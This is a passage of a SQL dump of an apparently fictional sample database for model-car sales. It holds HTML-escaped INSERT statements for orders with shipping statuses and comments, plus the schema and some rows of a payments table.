\u0026#39;2014-11-17\u0026#39;, \u0026#39;2014-11-23\u0026#39;, \u0026#39;2014-11-23\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested special shippment. The instructions were passed along to the warehouse\u0026#39;, \u0026#39;486\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;2014-11-17\u0026#39;, \u0026#39;2014-11-25\u0026#39;, \u0026#39;2014-11-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;187\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10333\u0026#39;, \u0026#39;2014-11-18\u0026#39;, \u0026#39;2014-11-27\u0026#39;, \u0026#39;2014-11-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;129\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10334\u0026#39;, \u0026#39;2014-11-19\u0026#39;, \u0026#39;2014-11-28\u0026#39;, null, \u0026#39;On Hold\u0026#39;, \u0026#39;The outstaniding balance for this customer exceeds their credit limit. Order will be shipped when a payment is received.\u0026#39;, \u0026#39;144\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10335\u0026#39;, \u0026#39;2014-11-19\u0026#39;, \u0026#39;2014-11-29\u0026#39;, \u0026#39;2014-11-23\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;2014-11-20\u0026#39;, \u0026#39;2014-11-26\u0026#39;, \u0026#39;2014-11-24\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that DHL is used for this shipping\u0026#39;, \u0026#39;172\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;2014-11-21\u0026#39;, \u0026#39;2014-11-30\u0026#39;, \u0026#39;2014-11-26\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;424\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10338\u0026#39;, \u0026#39;2014-11-22\u0026#39;, \u0026#39;2014-12-02\u0026#39;, \u0026#39;2014-11-27\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;381\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;2014-11-23\u0026#39;, \u0026#39;2014-11-30\u0026#39;, \u0026#39;2014-11-30\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;398\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10340\u0026#39;, \u0026#39;2014-11-24\u0026#39;, \u0026#39;2014-12-01\u0026#39;, \u0026#39;2014-11-25\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer is interested in buying more Ferrari models\u0026#39;, \u0026#39;216\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;2014-11-24\u0026#39;, \u0026#39;2014-12-01\u0026#39;, \u0026#39;2014-11-29\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;382\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;2014-11-24\u0026#39;, \u0026#39;2014-12-01\u0026#39;, \u0026#39;2014-11-29\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;114\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10343\u0026#39;, \u0026#39;2014-11-24\u0026#39;, \u0026#39;2014-12-01\u0026#39;, \u0026#39;2014-11-26\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;353\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10344\u0026#39;, \u0026#39;2014-11-25\u0026#39;, \u0026#39;2014-12-02\u0026#39;, \u0026#39;2014-11-29\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;350\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10345\u0026#39;, \u0026#39;2014-11-25\u0026#39;, \u0026#39;2014-12-01\u0026#39;, \u0026#39;2014-11-26\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;103\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10346\u0026#39;, \u0026#39;2014-11-29\u0026#39;, \u0026#39;2014-12-05\u0026#39;, \u0026#39;2014-11-30\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;112\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;2014-11-29\u0026#39;, \u0026#39;2014-12-07\u0026#39;, \u0026#39;2014-11-30\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Can we deliver the new Ford Mustang models by end-of-quarter?\u0026#39;, \u0026#39;114\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10348\u0026#39;, \u0026#39;2014-11-01\u0026#39;, \u0026#39;2014-11-08\u0026#39;, \u0026#39;2014-11-05\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;458\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10349\u0026#39;, \u0026#39;2014-12-01\u0026#39;, \u0026#39;2014-12-07\u0026#39;, \u0026#39;2014-12-03\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;151\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10350\u0026#39;, \u0026#39;2014-12-02\u0026#39;, \u0026#39;2014-12-08\u0026#39;, \u0026#39;2014-12-05\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10351\u0026#39;, \u0026#39;2014-12-03\u0026#39;, \u0026#39;2014-12-11\u0026#39;, \u0026#39;2014-12-07\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;324\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10352\u0026#39;, \u0026#39;2014-12-03\u0026#39;, \u0026#39;2014-12-12\u0026#39;, \u0026#39;2014-12-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;198\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10353\u0026#39;, \u0026#39;2014-12-04\u0026#39;, \u0026#39;2014-12-11\u0026#39;, \u0026#39;2014-12-05\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;447\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10354\u0026#39;, \u0026#39;2014-12-04\u0026#39;, \u0026#39;2014-12-10\u0026#39;, \u0026#39;2014-12-05\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;323\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10355\u0026#39;, \u0026#39;2014-12-07\u0026#39;, \u0026#39;2014-12-14\u0026#39;, \u0026#39;2014-12-13\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10356\u0026#39;, \u0026#39;2014-12-09\u0026#39;, \u0026#39;2014-12-15\u0026#39;, \u0026#39;2014-12-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;250\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10357\u0026#39;, \u0026#39;2014-12-10\u0026#39;, \u0026#39;2014-12-16\u0026#39;, \u0026#39;2014-12-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10358\u0026#39;, \u0026#39;2014-12-10\u0026#39;, \u0026#39;2014-12-16\u0026#39;, \u0026#39;2014-12-16\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that DHL is used for this shipping\u0026#39;, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10359\u0026#39;, \u0026#39;2014-12-15\u0026#39;, \u0026#39;2014-12-23\u0026#39;, \u0026#39;2014-12-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;353\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10360\u0026#39;, \u0026#39;2014-12-16\u0026#39;, \u0026#39;2014-12-22\u0026#39;, \u0026#39;2014-12-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;496\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10361\u0026#39;, \u0026#39;2014-12-17\u0026#39;, \u0026#39;2014-12-24\u0026#39;, \u0026#39;2014-12-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;282\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10362\u0026#39;, \u0026#39;2015-01-05\u0026#39;, \u0026#39;2015-01-16\u0026#39;, \u0026#39;2015-01-10\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;161\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10363\u0026#39;, \u0026#39;2015-01-06\u0026#39;, \u0026#39;2015-01-12\u0026#39;, \u0026#39;2015-01-10\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;334\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10364\u0026#39;, \u0026#39;2015-01-06\u0026#39;, \u0026#39;2015-01-17\u0026#39;, \u0026#39;2015-01-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;350\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10365\u0026#39;, \u0026#39;2015-01-07\u0026#39;, \u0026#39;2015-01-18\u0026#39;, \u0026#39;2015-01-11\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;320\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10366\u0026#39;, \u0026#39;2015-01-10\u0026#39;, \u0026#39;2015-01-19\u0026#39;, \u0026#39;2015-01-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;381\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10367\u0026#39;, \u0026#39;2015-01-12\u0026#39;, \u0026#39;2015-01-21\u0026#39;, \u0026#39;2015-01-16\u0026#39;, \u0026#39;Resolved\u0026#39;, \u0026#39;This order was disputed and resolved on 2/1/2005. Customer claimed that container with shipment was damaged. FedEx\\\u0026#39;s investigation proved this wrong.\u0026#39;, \u0026#39;205\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10368\u0026#39;, \u0026#39;2015-01-19\u0026#39;, \u0026#39;2015-01-27\u0026#39;, \u0026#39;2015-01-24\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Can we renegotiate this one?\u0026#39;, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10369\u0026#39;, \u0026#39;2015-01-20\u0026#39;, \u0026#39;2015-01-28\u0026#39;, \u0026#39;2015-01-24\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;379\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10370\u0026#39;, \u0026#39;2015-01-20\u0026#39;, \u0026#39;2015-02-01\u0026#39;, \u0026#39;2015-01-25\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;276\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10371\u0026#39;, \u0026#39;2015-01-23\u0026#39;, \u0026#39;2015-02-03\u0026#39;, \u0026#39;2015-01-25\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10372\u0026#39;, \u0026#39;2015-01-26\u0026#39;, \u0026#39;2015-02-05\u0026#39;, \u0026#39;2015-01-28\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;398\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10373\u0026#39;, \u0026#39;2015-01-31\u0026#39;, \u0026#39;2015-02-08\u0026#39;, \u0026#39;2015-02-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;311\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10374\u0026#39;, \u0026#39;2015-02-02\u0026#39;, \u0026#39;2015-02-09\u0026#39;, \u0026#39;2015-02-03\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;333\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10375\u0026#39;, \u0026#39;2015-02-03\u0026#39;, \u0026#39;2015-02-10\u0026#39;, \u0026#39;2015-02-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;119\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10376\u0026#39;, \u0026#39;2015-02-08\u0026#39;, \u0026#39;2015-02-18\u0026#39;, \u0026#39;2015-02-13\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;219\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10377\u0026#39;, \u0026#39;2015-02-09\u0026#39;, \u0026#39;2015-02-21\u0026#39;, \u0026#39;2015-02-12\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Cautious optimism. We have happy customers here, if we can keep them well stocked. I need all the information I can get on the planned shippments of Porches\u0026#39;, \u0026#39;186\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;2015-02-10\u0026#39;, \u0026#39;2015-02-18\u0026#39;, \u0026#39;2015-02-11\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10379\u0026#39;, \u0026#39;2015-02-10\u0026#39;, \u0026#39;2015-02-18\u0026#39;, \u0026#39;2015-02-11\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;2015-02-16\u0026#39;, \u0026#39;2015-02-24\u0026#39;, \u0026#39;2015-02-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;2015-02-17\u0026#39;, \u0026#39;2015-02-25\u0026#39;, \u0026#39;2015-02-18\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;321\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;2015-02-17\u0026#39;, \u0026#39;2015-02-23\u0026#39;, \u0026#39;2015-02-18\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Custom shipping instructions sent to warehouse\u0026#39;, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;2015-02-22\u0026#39;, \u0026#39;2015-03-02\u0026#39;, \u0026#39;2015-02-25\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10384\u0026#39;, \u0026#39;2015-02-23\u0026#39;, \u0026#39;2015-03-06\u0026#39;, \u0026#39;2015-02-27\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;321\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10385\u0026#39;, \u0026#39;2015-02-28\u0026#39;, \u0026#39;2015-03-09\u0026#39;, \u0026#39;2015-03-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;2015-03-01\u0026#39;, \u0026#39;2015-03-09\u0026#39;, \u0026#39;2015-03-06\u0026#39;, \u0026#39;Resolved\u0026#39;, \u0026#39;Disputed then Resolved on 3/15/2005. Customer doesn\\\u0026#39;t like the craftsmaship of the models.\u0026#39;, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10387\u0026#39;, \u0026#39;2015-03-02\u0026#39;, \u0026#39;2015-03-09\u0026#39;, \u0026#39;2015-03-06\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;We need to keep in close contact with their Marketing VP. He is the decision maker for all their purchases.\u0026#39;, \u0026#39;148\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10388\u0026#39;, \u0026#39;2015-03-03\u0026#39;, \u0026#39;2015-03-11\u0026#39;, \u0026#39;2015-03-09\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;462\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10389\u0026#39;, \u0026#39;2015-03-03\u0026#39;, \u0026#39;2015-03-09\u0026#39;, \u0026#39;2015-03-08\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;448\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;2015-03-04\u0026#39;, \u0026#39;2015-03-11\u0026#39;, \u0026#39;2015-03-07\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;They want to reevaluate their terms agreement with Finance.\u0026#39;, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;2015-03-09\u0026#39;, \u0026#39;2015-03-20\u0026#39;, \u0026#39;2015-03-15\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;276\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10392\u0026#39;, \u0026#39;2015-03-10\u0026#39;, \u0026#39;2015-03-18\u0026#39;, \u0026#39;2015-03-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;452\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;2015-03-11\u0026#39;, \u0026#39;2015-03-22\u0026#39;, \u0026#39;2015-03-14\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;They want to reevaluate their terms agreement with Finance.\u0026#39;, \u0026#39;323\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10394\u0026#39;, \u0026#39;2015-03-15\u0026#39;, \u0026#39;2015-03-25\u0026#39;, \u0026#39;2015-03-19\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10395\u0026#39;, \u0026#39;2015-03-17\u0026#39;, \u0026#39;2015-03-24\u0026#39;, \u0026#39;2015-03-23\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;We must be cautions with this customer. Their VP of Sales resigned. Company may be heading down.\u0026#39;, \u0026#39;250\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10396\u0026#39;, \u0026#39;2015-03-23\u0026#39;, \u0026#39;2015-04-02\u0026#39;, \u0026#39;2015-03-28\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10397\u0026#39;, \u0026#39;2015-03-28\u0026#39;, \u0026#39;2015-04-09\u0026#39;, \u0026#39;2015-04-01\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;242\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;2015-03-30\u0026#39;, \u0026#39;2015-04-09\u0026#39;, \u0026#39;2015-03-31\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;353\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10399\u0026#39;, \u0026#39;2015-04-01\u0026#39;, \u0026#39;2015-04-12\u0026#39;, \u0026#39;2015-04-03\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;496\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;2015-04-01\u0026#39;, \u0026#39;2015-04-11\u0026#39;, \u0026#39;2015-04-04\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that DHL is used for this shipping\u0026#39;, \u0026#39;450\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;2015-04-03\u0026#39;, \u0026#39;2015-04-14\u0026#39;, null, \u0026#39;On Hold\u0026#39;, \u0026#39;Customer credit limit exceeded. Will ship when a payment is received.\u0026#39;, \u0026#39;328\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10402\u0026#39;, \u0026#39;2015-04-07\u0026#39;, \u0026#39;2015-04-14\u0026#39;, \u0026#39;2015-04-12\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;406\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;2015-04-08\u0026#39;, \u0026#39;2015-04-18\u0026#39;, \u0026#39;2015-04-11\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;201\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10404\u0026#39;, \u0026#39;2015-04-08\u0026#39;, \u0026#39;2015-04-14\u0026#39;, \u0026#39;2015-04-11\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;323\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10405\u0026#39;, \u0026#39;2015-04-14\u0026#39;, \u0026#39;2015-04-24\u0026#39;, \u0026#39;2015-04-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;209\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10406\u0026#39;, \u0026#39;2015-04-15\u0026#39;, \u0026#39;2015-04-25\u0026#39;, \u0026#39;2015-04-21\u0026#39;, \u0026#39;Disputed\u0026#39;, \u0026#39;Customer claims container with shipment was damaged during shipping and some items were missing. I am talking to FedEx about this.\u0026#39;, \u0026#39;145\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;2015-04-22\u0026#39;, \u0026#39;2015-05-04\u0026#39;, null, \u0026#39;On Hold\u0026#39;, \u0026#39;Customer credit limit exceeded. Will ship when a payment is received.\u0026#39;, \u0026#39;450\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10408\u0026#39;, \u0026#39;2015-04-22\u0026#39;, \u0026#39;2015-04-29\u0026#39;, \u0026#39;2015-04-27\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;398\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10409\u0026#39;, \u0026#39;2015-04-23\u0026#39;, \u0026#39;2015-05-05\u0026#39;, \u0026#39;2015-04-24\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;166\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;2015-04-29\u0026#39;, \u0026#39;2015-05-10\u0026#39;, \u0026#39;2015-04-30\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;357\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;2015-05-01\u0026#39;, \u0026#39;2015-05-08\u0026#39;, \u0026#39;2015-05-06\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;233\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;2015-05-03\u0026#39;, \u0026#39;2015-05-13\u0026#39;, \u0026#39;2015-05-05\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10413\u0026#39;, \u0026#39;2015-05-05\u0026#39;, \u0026#39;2015-05-14\u0026#39;, \u0026#39;2015-05-09\u0026#39;, \u0026#39;Shipped\u0026#39;, \u0026#39;Customer requested that DHL is used for this shipping\u0026#39;, \u0026#39;175\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10414\u0026#39;, \u0026#39;2015-05-06\u0026#39;, \u0026#39;2015-05-13\u0026#39;, null, \u0026#39;On Hold\u0026#39;, \u0026#39;Customer credit limit exceeded. Will ship when a payment is received.\u0026#39;, \u0026#39;362\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10415\u0026#39;, \u0026#39;2015-05-09\u0026#39;, \u0026#39;2015-05-20\u0026#39;, \u0026#39;2015-05-12\u0026#39;, \u0026#39;Disputed\u0026#39;, \u0026#39;Customer claims the scales of the models don\\\u0026#39;t match what was discussed. I keep all the paperwork though to prove otherwise\u0026#39;, \u0026#39;471\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10416\u0026#39;, \u0026#39;2015-05-10\u0026#39;, \u0026#39;2015-05-16\u0026#39;, \u0026#39;2015-05-14\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;386\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10417\u0026#39;, \u0026#39;2015-05-13\u0026#39;, \u0026#39;2015-05-19\u0026#39;, \u0026#39;2015-05-19\u0026#39;, \u0026#39;Disputed\u0026#39;, \u0026#39;Customer doesn\\\u0026#39;t like the colors and precision of the models.\u0026#39;, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10418\u0026#39;, \u0026#39;2015-05-16\u0026#39;, \u0026#39;2015-05-24\u0026#39;, \u0026#39;2015-05-20\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;412\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10419\u0026#39;, \u0026#39;2015-05-17\u0026#39;, \u0026#39;2015-05-28\u0026#39;, \u0026#39;2015-05-19\u0026#39;, \u0026#39;Shipped\u0026#39;, null, \u0026#39;382\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10420\u0026#39;, \u0026#39;2015-05-29\u0026#39;, \u0026#39;2015-06-07\u0026#39;, null, \u0026#39;In Process\u0026#39;, null, \u0026#39;282\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10421\u0026#39;, \u0026#39;2015-05-29\u0026#39;, \u0026#39;2015-06-06\u0026#39;, null, \u0026#39;In Process\u0026#39;, \u0026#39;Custom shipping instructions were sent to warehouse\u0026#39;, \u0026#39;124\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10422\u0026#39;, \u0026#39;2015-05-30\u0026#39;, \u0026#39;2015-06-11\u0026#39;, null, \u0026#39;In Process\u0026#39;, null, \u0026#39;157\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10423\u0026#39;, \u0026#39;2015-05-30\u0026#39;, \u0026#39;2015-06-05\u0026#39;, null, \u0026#39;In Process\u0026#39;, null, \u0026#39;314\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10424\u0026#39;, \u0026#39;2015-05-31\u0026#39;, \u0026#39;2015-06-08\u0026#39;, null, \u0026#39;In Process\u0026#39;, null, \u0026#39;141\u0026#39;); INSERT INTO `orders` VALUES (\u0026#39;10425\u0026#39;, \u0026#39;2015-05-31\u0026#39;, \u0026#39;2015-06-07\u0026#39;, null, \u0026#39;In Process\u0026#39;, null, \u0026#39;119\u0026#39;); -- ---------------------------- -- Table structure for `payments` -- ---------------------------- DROP TABLE IF EXISTS `payments`; CREATE TABLE `payments` ( `customerNumber` int(11) NOT NULL, `checkNumber` varchar(50) NOT NULL, `paymentDate` date NOT NULL, `amount` decimal(10,2) NOT NULL, PRIMARY KEY (`customerNumber`,`checkNumber`), CONSTRAINT `payments_ibfk_1` FOREIGN KEY (`customerNumber`) REFERENCES `customers` (`customerNumber`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of payments -- ---------------------------- INSERT INTO `payments` VALUES (\u0026#39;103\u0026#39;, \u0026#39;HQ336336\u0026#39;, \u0026#39;2014-10-19\u0026#39;, \u0026#39;6066.78\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;103\u0026#39;, \u0026#39;JM555205\u0026#39;, \u0026#39;2013-06-05\u0026#39;, \u0026#39;14571.44\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;103\u0026#39;, \u0026#39;OM314933\u0026#39;, \u0026#39;2014-12-18\u0026#39;, \u0026#39;1676.14\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;112\u0026#39;, \u0026#39;BO864823\u0026#39;, \u0026#39;2014-12-17\u0026#39;, \u0026#39;14191.12\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;112\u0026#39;, \u0026#39;HQ55022\u0026#39;, \u0026#39;2013-06-06\u0026#39;, \u0026#39;32641.98\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;112\u0026#39;, \u0026#39;ND748579\u0026#39;, \u0026#39;2014-08-20\u0026#39;, \u0026#39;33347.88\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;114\u0026#39;, \u0026#39;GG31455\u0026#39;, \u0026#39;2013-05-20\u0026#39;, \u0026#39;45864.03\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;114\u0026#39;, \u0026#39;MA765515\u0026#39;, \u0026#39;2014-12-15\u0026#39;, \u0026#39;82261.22\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;114\u0026#39;, \u0026#39;NP603840\u0026#39;, \u0026#39;2013-05-31\u0026#39;, \u0026#39;7565.08\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;114\u0026#39;, \u0026#39;NR27552\u0026#39;, \u0026#39;2014-03-10\u0026#39;, \u0026#39;44894.74\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;119\u0026#39;, \u0026#39;DB933704\u0026#39;, \u0026#39;2014-11-14\u0026#39;, \u0026#39;19501.82\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;119\u0026#39;, \u0026#39;LN373447\u0026#39;, \u0026#39;2014-08-08\u0026#39;, \u0026#39;47924.19\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;119\u0026#39;, \u0026#39;NG94694\u0026#39;, \u0026#39;2015-02-22\u0026#39;, \u0026#39;49523.67\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;121\u0026#39;, \u0026#39;DB889831\u0026#39;, \u0026#39;2013-02-16\u0026#39;, \u0026#39;50218.95\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;121\u0026#39;, \u0026#39;FD317790\u0026#39;, \u0026#39;2013-10-28\u0026#39;, \u0026#39;1491.38\u0026#39;); 